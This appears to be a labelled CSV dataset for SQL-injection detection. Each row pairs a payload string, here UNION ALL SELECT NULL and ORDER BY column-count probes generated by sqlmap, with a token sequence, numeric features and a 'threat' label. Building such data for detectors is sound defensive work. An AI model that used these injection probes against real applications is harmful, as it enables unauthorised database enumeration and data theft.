"johnbaston)) UNION ALL SELECT NULL,NULL,NULL#",STR RPRN RPRN UNION ALL SELECT NULL CMMA NULL CMMA NULL HASH,0.36363636363636365 0.4545454545454546 0.5454545454545454 0.6363636363636364 0.7272727272727273 0.7272727272727273 0.7272727272727273 0.7272727272727273 0.6363636363636364 0.5454545454545454 0.4545454545454546 0.36363636363636365,POST,sqlmap/1.2.4#stable (http://sqlmap.org),threat
"johnbaston)) UNION ALL SELECT NULL,NULL,NULL,NULL#",STR RPRN RPRN UNION ALL SELECT NULL CMMA NULL CMMA NULL CMMA NULL HASH,0.3076923076923077 0.38461538461538464 0.46153846153846156 0.5384615384615385 0.6153846153846154 0.6153846153846154 0.6153846153846154 0.6153846153846154 0.6153846153846154 0.6153846153846154 0.5384615384615385 0.46153846153846156 0.38461538461538464 0.3076923076923077,POST,sqlmap/1.2.4#stable (http://sqlmap.org),threat
"johnbaston)) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL#",STR RPRN RPRN UNION ALL SELECT NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL HASH,0.26666666666666666 0.3333333333333333 0.4 0.4666666666666667 0.5333333333333333 0.5333333333333333 0.5333333333333333 0.5333333333333333 0.5333333333333333 0.5333333333333333 0.5333333333333333 0.5333333333333333 0.4666666666666667 0.4 0.3333333333333333 0.26666666666666666,POST,sqlmap/1.2.4#stable (http://sqlmap.org),threat
"johnbaston)) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL#",STR RPRN RPRN UNION ALL SELECT NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL HASH,0.23529411764705882 0.29411764705882354 0.3529411764705882 0.4117647058823529 0.47058823529411764 0.47058823529411764 0.47058823529411764 0.47058823529411764 0.47058823529411764 0.47058823529411764 0.47058823529411764 0.47058823529411764 0.47058823529411764 0.47058823529411764 0.4117647058823529 0.3529411764705882 0.29411764705882354 0.23529411764705882,POST,sqlmap/1.2.4#stable (http://sqlmap.org),threat
"johnbaston)) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL#",STR RPRN RPRN UNION ALL SELECT NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL HASH,0.23529411764705882 0.29411764705882354 0.3529411764705882 0.4117647058823529 0.47058823529411764 0.47058823529411764 0.47058823529411764 0.47058823529411764 0.47058823529411764 0.47058823529411764 0.47058823529411764 0.47058823529411764 0.47058823529411764 0.47058823529411764 0.4117647058823529 0.3529411764705882 0.29411764705882354 0.23529411764705882,POST,sqlmap/1.2.4#stable (http://sqlmap.org),threat
"johnbaston)) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL#",STR RPRN RPRN UNION ALL SELECT NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL HASH,0.21052631578947367 0.2631578947368421 0.3157894736842105 0.3684210526315789 0.42105263157894735 0.42105263157894735 0.42105263157894735 0.42105263157894735 0.42105263157894735 0.42105263157894735 0.42105263157894735 0.42105263157894735 0.42105263157894735 0.42105263157894735 0.42105263157894735 0.42105263157894735 0.3684210526315789 0.3157894736842105 0.2631578947368421 0.21052631578947367,POST,sqlmap/1.2.4#stable (http://sqlmap.org),threat
"johnbaston)) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL#",STR RPRN RPRN UNION ALL SELECT NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL HASH,0.21052631578947367 0.2631578947368421 0.3157894736842105 0.3684210526315789 0.42105263157894735 0.42105263157894735 0.42105263157894735 0.42105263157894735 0.42105263157894735 0.42105263157894735 0.42105263157894735 0.42105263157894735 0.42105263157894735 0.42105263157894735 0.42105263157894735 0.42105263157894735 0.3684210526315789 0.3157894736842105 0.2631578947368421 0.21052631578947367,POST,sqlmap/1.2.4#stable (http://sqlmap.org),threat
"johnbaston)) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#",STR RPRN RPRN UNION ALL SELECT NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL HASH,0.19047619047619047 0.23809523809523808 0.2857142857142857 0.3333333333333333 0.38095238095238093 0.38095238095238093 0.38095238095238093 0.38095238095238093 0.38095238095238093 0.38095238095238093 0.38095238095238093 0.38095238095238093 0.38095238095238093 0.38095238095238093 0.38095238095238093 0.38095238095238093 0.38095238095238093 0.38095238095238093 0.3333333333333333 0.2857142857142857 0.23809523809523808 0.19047619047619047,POST,sqlmap/1.2.4#stable (http://sqlmap.org),threat
"johnbaston)) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#",STR RPRN RPRN UNION ALL SELECT NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL HASH,0.17391304347826086 0.21739130434782608 0.2608695652173913 0.30434782608695654 0.34782608695652173 0.34782608695652173 0.34782608695652173 0.34782608695652173 0.34782608695652173 0.34782608695652173 0.34782608695652173 0.34782608695652173 0.34782608695652173 0.34782608695652173 0.34782608695652173 0.34782608695652173 0.34782608695652173 0.34782608695652173 0.34782608695652173 0.34782608695652173 0.30434782608695654 0.2608695652173913 0.21739130434782608 0.17391304347826086,POST,sqlmap/1.2.4#stable (http://sqlmap.org),threat
"johnbaston)) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#",STR RPRN RPRN UNION ALL SELECT NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL HASH,0.17391304347826086 0.21739130434782608 0.2608695652173913 0.30434782608695654 0.34782608695652173 0.34782608695652173 0.34782608695652173 0.34782608695652173 0.34782608695652173 0.34782608695652173 0.34782608695652173 0.34782608695652173 0.34782608695652173 0.34782608695652173 0.34782608695652173 0.34782608695652173 0.34782608695652173 0.34782608695652173 0.34782608695652173 0.34782608695652173 0.30434782608695654 0.2608695652173913 0.21739130434782608 0.17391304347826086,POST,sqlmap/1.2.4#stable (http://sqlmap.org),threat
"johnbaston)) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#",STR RPRN RPRN UNION ALL SELECT NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL HASH,0.16 0.2 0.24 0.28 0.32 0.32 0.32 0.32 0.32 0.32 0.32 0.32 0.32 0.32 0.32 0.32 0.32 0.32 0.32 0.32 0.32 0.32 0.28 0.24 0.2 0.16,POST,sqlmap/1.2.4#stable (http://sqlmap.org),threat
"johnbaston)) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#",STR RPRN RPRN UNION ALL SELECT NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL HASH,0.16 0.2 0.24 0.28 0.32 0.32 0.32 0.32 0.32 0.32 0.32 0.32 0.32 0.32 0.32 0.32 0.32 0.32 0.32 0.32 0.32 0.32 0.28 0.24 0.2 0.16,POST,sqlmap/1.2.4#stable (http://sqlmap.org),threat
johnbaston ORDER BY 1#,STR ORDER BY INT HASH,1.0 1.0 1.0 1.0 1.0,POST,sqlmap/1.2.4#stable (http://sqlmap.org),threat
johnbaston ORDER BY 11#,STR ORDER BY INT HASH,1.0 1.0 1.0 1.0 1.0,POST,sqlmap/1.2.4#stable (http://sqlmap.org),threat
johnbaston ORDER BY 11#,STR ORDER BY INT HASH,1.0 1.0 1.0 1.0 1.0,POST,sqlmap/1.2.4#stable (http://sqlmap.org),threat
johnbaston UNION ALL SELECT NULL#,STR UNION ALL SELECT NULL HASH,0.8 1.0 1.0 1.0 1.0 0.8,POST,sqlmap/1.2.4#stable (http://sqlmap.org),threat
johnbaston UNION ALL SELECT NULL#,STR UNION ALL SELECT NULL HASH,0.8 1.0 1.0 1.0 1.0 0.8,POST,sqlmap/1.2.4#stable (http://sqlmap.org),threat
"johnbaston UNION ALL SELECT NULL,NULL#",STR UNION ALL SELECT NULL CMMA NULL HASH,0.5714285714285714 0.7142857142857142 0.8571428571428571 1.0 1.0 0.8571428571428571 0.7142857142857142 0.5714285714285714,POST,sqlmap/1.2.4#stable (http://sqlmap.org),threat
"johnbaston UNION ALL SELECT NULL,NULL#",STR UNION ALL SELECT NULL CMMA NULL HASH,0.5714285714285714 0.7142857142857142 0.8571428571428571 1.0 1.0 0.8571428571428571 0.7142857142857142 0.5714285714285714,POST,sqlmap/1.2.4#stable (http://sqlmap.org),threat
"johnbaston UNION ALL SELECT NULL,NULL,NULL#",STR UNION ALL SELECT NULL CMMA NULL CMMA NULL HASH,0.4444444444444444 0.5555555555555556 0.6666666666666666 0.7777777777777777 0.8888888888888888 0.8888888888888888 0.7777777777777777 0.6666666666666666 0.5555555555555556 0.4444444444444444,POST,sqlmap/1.2.4#stable (http://sqlmap.org),threat
"johnbaston UNION ALL SELECT NULL,NULL,NULL#",STR UNION ALL SELECT NULL CMMA NULL CMMA NULL HASH,0.4444444444444444 0.5555555555555556 0.6666666666666666 0.7777777777777777 0.8888888888888888 0.8888888888888888 0.7777777777777777 0.6666666666666666 0.5555555555555556 0.4444444444444444,POST,sqlmap/1.2.4#stable (http://sqlmap.org),threat
"johnbaston UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL#",STR UNION ALL SELECT NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL HASH,0.26666666666666666 0.3333333333333333 0.4 0.4666666666666667 0.5333333333333333 0.5333333333333333 0.5333333333333333 0.5333333333333333 0.5333333333333333 0.5333333333333333 0.5333333333333333 0.5333333333333333 0.4666666666666667 0.4 0.3333333333333333 0.26666666666666666,POST,sqlmap/1.2.4#stable (http://sqlmap.org),threat
"johnbaston UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#",STR UNION ALL SELECT NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL HASH,0.21052631578947367 0.2631578947368421 0.3157894736842105 0.3684210526315789 0.42105263157894735 0.42105263157894735 0.42105263157894735 0.42105263157894735 0.42105263157894735 0.42105263157894735 0.42105263157894735 0.42105263157894735 0.42105263157894735 0.42105263157894735 0.42105263157894735 0.42105263157894735 0.3684210526315789 0.3157894736842105 0.2631578947368421 0.21052631578947367,POST,sqlmap/1.2.4#stable (http://sqlmap.org),threat
"johnbaston UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#",STR UNION ALL SELECT NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL HASH,0.21052631578947367 0.2631578947368421 0.3157894736842105 0.3684210526315789 0.42105263157894735 0.42105263157894735 0.42105263157894735 0.42105263157894735 0.42105263157894735 0.42105263157894735 0.42105263157894735 0.42105263157894735 0.42105263157894735 0.42105263157894735 0.42105263157894735 0.42105263157894735 0.3684210526315789 0.3157894736842105 0.2631578947368421 0.21052631578947367,POST,sqlmap/1.2.4#stable (http://sqlmap.org),threat
"johnbaston UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#",STR UNION ALL SELECT NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL HASH,0.19047619047619047 0.23809523809523808 0.2857142857142857 0.3333333333333333 0.38095238095238093 0.38095238095238093 0.38095238095238093 0.38095238095238093 0.38095238095238093 0.38095238095238093 0.38095238095238093 0.38095238095238093 0.38095238095238093 0.38095238095238093 0.38095238095238093 0.38095238095238093 0.38095238095238093 0.38095238095238093 0.3333333333333333 0.2857142857142857 0.23809523809523808 0.19047619047619047,POST,sqlmap/1.2.4#stable (http://sqlmap.org),threat
"johnbaston UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#",STR UNION ALL SELECT NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL HASH,0.17391304347826086 0.21739130434782608 0.2608695652173913 0.30434782608695654 0.34782608695652173 0.34782608695652173 0.34782608695652173 0.34782608695652173 0.34782608695652173 0.34782608695652173 0.34782608695652173 0.34782608695652173 0.34782608695652173 0.34782608695652173 0.34782608695652173 0.34782608695652173 0.34782608695652173 0.34782608695652173 0.34782608695652173 0.34782608695652173 0.30434782608695654 0.2608695652173913 0.21739130434782608 0.17391304347826086,POST,sqlmap/1.2.4#stable (http://sqlmap.org),threat
"johnbaston UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#",STR UNION ALL SELECT NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL HASH,0.17391304347826086 0.21739130434782608 0.2608695652173913 0.30434782608695654 0.34782608695652173 0.34782608695652173 0.34782608695652173 0.34782608695652173 0.34782608695652173 0.34782608695652173 0.34782608695652173 0.34782608695652173 0.34782608695652173 0.34782608695652173 0.34782608695652173 0.34782608695652173 0.34782608695652173 0.34782608695652173 0.34782608695652173 0.34782608695652173 0.30434782608695654 0.2608695652173913 0.21739130434782608 0.17391304347826086,POST,sqlmap/1.2.4#stable (http://sqlmap.org),threat
johnbaston ORDER BY 11#,STR ORDER BY INT HASH,1.0 1.0 1.0 1.0 1.0,POST,sqlmap/1.2.4#stable (http://sqlmap.org),threat
johnbaston ORDER BY 11#,STR ORDER BY INT HASH,1.0 1.0 1.0 1.0 1.0,POST,sqlmap/1.2.4#stable (http://sqlmap.org),threat
johnbaston UNION ALL SELECT NULL#,STR UNION ALL SELECT NULL HASH,0.8 1.0 1.0 1.0 1.0 0.8,POST,sqlmap/1.2.4#stable (http://sqlmap.org),threat
johnbaston UNION ALL SELECT NULL#,STR UNION ALL SELECT NULL HASH,0.8 1.0 1.0 1.0 1.0 0.8,POST,sqlmap/1.2.4#stable (http://sqlmap.org),threat
"johnbaston UNION ALL SELECT NULL,NULL#",STR UNION ALL SELECT NULL CMMA NULL HASH,0.5714285714285714 0.7142857142857142 0.8571428571428571 1.0 1.0 0.8571428571428571 0.7142857142857142 0.5714285714285714,POST,sqlmap/1.2.4#stable (http://sqlmap.org),threat
"johnbaston UNION ALL SELECT NULL,NULL#",STR UNION ALL SELECT NULL CMMA NULL HASH,0.5714285714285714 0.7142857142857142 0.8571428571428571 1.0 1.0 0.8571428571428571 0.7142857142857142 0.5714285714285714,POST,sqlmap/1.2.4#stable (http://sqlmap.org),threat
"johnbaston UNION ALL SELECT NULL,NULL,NULL#",STR UNION ALL SELECT NULL CMMA NULL CMMA NULL HASH,0.4444444444444444 0.5555555555555556 0.6666666666666666 0.7777777777777777 0.8888888888888888 0.8888888888888888 0.7777777777777777 0.6666666666666666 0.5555555555555556 0.4444444444444444,POST,sqlmap/1.2.4#stable (http://sqlmap.org),threat
"johnbaston UNION ALL SELECT NULL,NULL,NULL,NULL#",STR UNION ALL SELECT NULL CMMA NULL CMMA NULL CMMA NULL HASH,0.36363636363636365 0.4545454545454546 0.5454545454545454 0.6363636363636364 0.7272727272727273 0.7272727272727273 0.7272727272727273 0.7272727272727273 0.6363636363636364 0.5454545454545454 0.4545454545454546 0.36363636363636365,POST,sqlmap/1.2.4#stable (http://sqlmap.org),threat
"johnbaston UNION ALL SELECT NULL,NULL,NULL,NULL#",STR UNION ALL SELECT NULL CMMA NULL CMMA NULL CMMA NULL HASH,0.36363636363636365 0.4545454545454546 0.5454545454545454 0.6363636363636364 0.7272727272727273 0.7272727272727273 0.7272727272727273 0.7272727272727273 0.6363636363636364 0.5454545454545454 0.4545454545454546 0.36363636363636365,POST,sqlmap/1.2.4#stable (http://sqlmap.org),threat
"johnbaston UNION ALL SELECT NULL,NULL,NULL,NULL,NULL#",STR UNION ALL SELECT NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL HASH,0.3076923076923077 0.38461538461538464 0.46153846153846156 0.5384615384615385 0.6153846153846154 0.6153846153846154 0.6153846153846154 0.6153846153846154 0.6153846153846154 0.6153846153846154 0.5384615384615385 0.46153846153846156 0.38461538461538464 0.3076923076923077,POST,sqlmap/1.2.4#stable (http://sqlmap.org),threat
"johnbaston UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL#",STR UNION ALL SELECT NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL HASH,0.26666666666666666 0.3333333333333333 0.4 0.4666666666666667 0.5333333333333333 0.5333333333333333 0.5333333333333333 0.5333333333333333 0.5333333333333333 0.5333333333333333 0.5333333333333333 0.5333333333333333 0.4666666666666667 0.4 0.3333333333333333 0.26666666666666666,POST,sqlmap/1.2.4#stable (http://sqlmap.org),threat
"johnbaston UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL#",STR UNION ALL SELECT NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL HASH,0.26666666666666666 0.3333333333333333 0.4 0.4666666666666667 0.5333333333333333 0.5333333333333333 0.5333333333333333 0.5333333333333333 0.5333333333333333 0.5333333333333333 0.5333333333333333 0.5333333333333333 0.4666666666666667 0.4 0.3333333333333333 0.26666666666666666,POST,sqlmap/1.2.4#stable (http://sqlmap.org),threat
"johnbaston UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#",STR UNION ALL SELECT NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL HASH,0.19047619047619047 0.23809523809523808 0.2857142857142857 0.3333333333333333 0.38095238095238093 0.38095238095238093 0.38095238095238093 0.38095238095238093 0.38095238095238093 0.38095238095238093 0.38095238095238093 0.38095238095238093 0.38095238095238093 0.38095238095238093 0.38095238095238093 0.38095238095238093 0.38095238095238093 0.38095238095238093 0.3333333333333333 0.2857142857142857 0.23809523809523808 0.19047619047619047,POST,sqlmap/1.2.4#stable (http://sqlmap.org),threat
"johnbaston UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#",STR UNION ALL SELECT NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL HASH,0.19047619047619047 0.23809523809523808 0.2857142857142857 0.3333333333333333 0.38095238095238093 0.38095238095238093 0.38095238095238093 0.38095238095238093 0.38095238095238093 0.38095238095238093 0.38095238095238093 0.38095238095238093 0.38095238095238093 0.38095238095238093 0.38095238095238093 0.38095238095238093 0.38095238095238093 0.38095238095238093 0.3333333333333333 0.2857142857142857 0.23809523809523808 0.19047619047619047,POST,sqlmap/1.2.4#stable (http://sqlmap.org),threat
"johnbaston') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#",STR SQUT RPRN UNION ALL SELECT NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL HASH,0.14814814814814814 0.18518518518518517 0.2222222222222222 0.25925925925925924 0.2962962962962963 0.2962962962962963 0.2962962962962963 0.2962962962962963 0.2962962962962963 0.2962962962962963 0.2962962962962963 0.2962962962962963 0.2962962962962963 0.2962962962962963 0.2962962962962963 0.2962962962962963 0.2962962962962963 0.2962962962962963 0.2962962962962963 0.2962962962962963 0.2962962962962963 0.2962962962962963 0.2962962962962963 0.2962962962962963 0.25925925925925924 0.2222222222222222 0.18518518518518517 0.14814814814814814,POST,sqlmap/1.2.4#stable (http://sqlmap.org),threat
"johnbaston') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#",STR SQUT RPRN UNION ALL SELECT NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL HASH,0.14814814814814814 0.18518518518518517 0.2222222222222222 0.25925925925925924 0.2962962962962963 0.2962962962962963 0.2962962962962963 0.2962962962962963 0.2962962962962963 0.2962962962962963 0.2962962962962963 0.2962962962962963 0.2962962962962963 0.2962962962962963 0.2962962962962963 0.2962962962962963 0.2962962962962963 0.2962962962962963 0.2962962962962963 0.2962962962962963 0.2962962962962963 0.2962962962962963 0.2962962962962963 0.2962962962962963 0.25925925925925924 0.2222222222222222 0.18518518518518517 0.14814814814814814,POST,sqlmap/1.2.4#stable (http://sqlmap.org),threat
"johnbaston') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#",STR SQUT RPRN UNION ALL SELECT NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL HASH,0.13793103448275862 0.1724137931034483 0.20689655172413793 0.24137931034482757 0.27586206896551724 0.27586206896551724 0.27586206896551724 0.27586206896551724 0.27586206896551724 0.27586206896551724 0.27586206896551724 0.27586206896551724 0.27586206896551724 0.27586206896551724 0.27586206896551724 0.27586206896551724 0.27586206896551724 0.27586206896551724 0.27586206896551724 0.27586206896551724 0.27586206896551724 0.27586206896551724 0.27586206896551724 0.27586206896551724 0.27586206896551724 0.27586206896551724 0.24137931034482757 0.20689655172413793 0.1724137931034483 0.13793103448275862,POST,sqlmap/1.2.4#stable (http://sqlmap.org),threat
"johnbaston') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#",STR SQUT RPRN UNION ALL SELECT NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL HASH,0.13793103448275862 0.1724137931034483 0.20689655172413793 0.24137931034482757 0.27586206896551724 0.27586206896551724 0.27586206896551724 0.27586206896551724 0.27586206896551724 0.27586206896551724 0.27586206896551724 0.27586206896551724 0.27586206896551724 0.27586206896551724 0.27586206896551724 0.27586206896551724 0.27586206896551724 0.27586206896551724 0.27586206896551724 0.27586206896551724 0.27586206896551724 0.27586206896551724 0.27586206896551724 0.27586206896551724 0.27586206896551724 0.27586206896551724 0.24137931034482757 0.20689655172413793 0.1724137931034483 0.13793103448275862,POST,sqlmap/1.2.4#stable (http://sqlmap.org),threat
"johnbaston') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#",STR SQUT RPRN UNION ALL SELECT NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL HASH,0.12903225806451613 0.16129032258064516 0.1935483870967742 0.22580645161290322 0.25806451612903225 0.25806451612903225 0.25806451612903225 0.25806451612903225 0.25806451612903225 0.25806451612903225 0.25806451612903225 0.25806451612903225 0.25806451612903225 0.25806451612903225 0.25806451612903225 0.25806451612903225 0.25806451612903225 0.25806451612903225 0.25806451612903225 0.25806451612903225 0.25806451612903225 0.25806451612903225 0.25806451612903225 0.25806451612903225 0.25806451612903225 0.25806451612903225 0.25806451612903225 0.25806451612903225 0.22580645161290322 0.1935483870967742 0.16129032258064516 0.12903225806451613,POST,sqlmap/1.2.4#stable (http://sqlmap.org),threat
"johnbaston') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#",STR SQUT RPRN UNION ALL SELECT NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL HASH,0.12903225806451613 0.16129032258064516 0.1935483870967742 0.22580645161290322 0.25806451612903225 0.25806451612903225 0.25806451612903225 0.25806451612903225 0.25806451612903225 0.25806451612903225 0.25806451612903225 0.25806451612903225 0.25806451612903225 0.25806451612903225 0.25806451612903225 0.25806451612903225 0.25806451612903225 0.25806451612903225 0.25806451612903225 0.25806451612903225 0.25806451612903225 0.25806451612903225 0.25806451612903225 0.25806451612903225 0.25806451612903225 0.25806451612903225 0.25806451612903225 0.25806451612903225 0.22580645161290322 0.1935483870967742 0.16129032258064516 0.12903225806451613,POST,sqlmap/1.2.4#stable (http://sqlmap.org),threat
"johnbaston') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#",STR SQUT RPRN UNION ALL SELECT NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL HASH,0.12121212121212122 0.15151515151515152 0.18181818181818182 0.21212121212121213 0.24242424242424243 0.24242424242424243 0.24242424242424243 0.24242424242424243 0.24242424242424243 0.24242424242424243 0.24242424242424243 0.24242424242424243 0.24242424242424243 0.24242424242424243 0.24242424242424243 0.24242424242424243 0.24242424242424243 0.24242424242424243 0.24242424242424243 0.24242424242424243 0.24242424242424243 0.24242424242424243 0.24242424242424243 0.24242424242424243 0.24242424242424243 0.24242424242424243 0.24242424242424243 0.24242424242424243 0.24242424242424243 0.24242424242424243 0.21212121212121213 0.18181818181818182 0.15151515151515152 0.12121212121212122,POST,sqlmap/1.2.4#stable (http://sqlmap.org),threat
"johnbaston') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#",STR SQUT RPRN UNION ALL SELECT NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL HASH,0.12121212121212122 0.15151515151515152 0.18181818181818182 0.21212121212121213 0.24242424242424243 0.24242424242424243 0.24242424242424243 0.24242424242424243 0.24242424242424243 0.24242424242424243 0.24242424242424243 0.24242424242424243 0.24242424242424243 0.24242424242424243 0.24242424242424243 0.24242424242424243 0.24242424242424243 0.24242424242424243 0.24242424242424243 0.24242424242424243 0.24242424242424243 0.24242424242424243 0.24242424242424243 0.24242424242424243 0.24242424242424243 0.24242424242424243 0.24242424242424243 0.24242424242424243 0.24242424242424243 0.24242424242424243 0.21212121212121213 0.18181818181818182 0.15151515151515152 0.12121212121212122,POST,sqlmap/1.2.4#stable (http://sqlmap.org),threat
"johnbaston') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#",STR SQUT RPRN UNION ALL SELECT NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL HASH,0.11428571428571428 0.14285714285714285 0.17142857142857143 0.19999999999999998 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.22857142857142856 0.19999999999999998 0.17142857142857143 0.14285714285714285 0.11428571428571428,POST,sqlmap/1.2.4#stable (http://sqlmap.org),threat
